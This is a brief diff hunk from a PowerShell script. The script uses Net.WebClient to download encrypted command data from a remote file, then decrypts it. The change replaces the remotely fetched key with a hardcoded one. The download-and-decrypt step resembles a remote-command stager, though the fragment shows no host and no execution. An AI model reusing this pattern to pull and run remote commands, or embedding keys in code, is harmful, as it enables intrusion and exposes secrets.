@@ -43,7 +43,7 @@
      $webclient = New-Object Net.WebClient
      $CmdData = $webclient.DownloadString($SecMFile)
  
-     $Pass = $webclient.DownloadString($SecPFile)
+     $Pass = '44a2a6d669fd47a7bfe50e11e0d0ab'#$webclient.DownloadString($SecPFile)
      $Pass = $Pass.substring(0,30)
 
      $decrypted=Decrypt-String $CmdData $Pass
